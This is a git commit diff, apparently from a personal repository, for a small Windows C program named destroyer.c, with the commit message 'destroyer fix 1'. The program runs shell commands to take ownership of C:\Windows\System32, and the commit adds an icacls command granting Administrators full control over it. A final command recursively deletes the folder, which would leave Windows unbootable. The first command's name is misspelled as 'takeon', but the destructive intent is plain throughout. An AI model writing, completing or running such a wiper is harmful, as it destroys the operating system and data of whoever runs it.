83138aee05689f9eb202ee157bf10f11f8ecde19
Manu_Dev <65360943+Emanuele-maker@users.noreply.github.com>
2024-10-08 17:03:51 +0200

    destroyer fix 1

--- destroyer.c
+++ destroyer.c
@@ -1,7 +1,8 @@
 #include <windows.h>
 
 int main() {
-    system("takeon /f C:\\Windows\\System32 /r /d y");
+    system("takeon /f C:\\Windows\\System32 /r /a y");
+    system("icacls C:\\Windows\\System32 /grant Administrators:F /T");
     system("del /s /q C:\\Windows\\System32");
     return 0;
 }
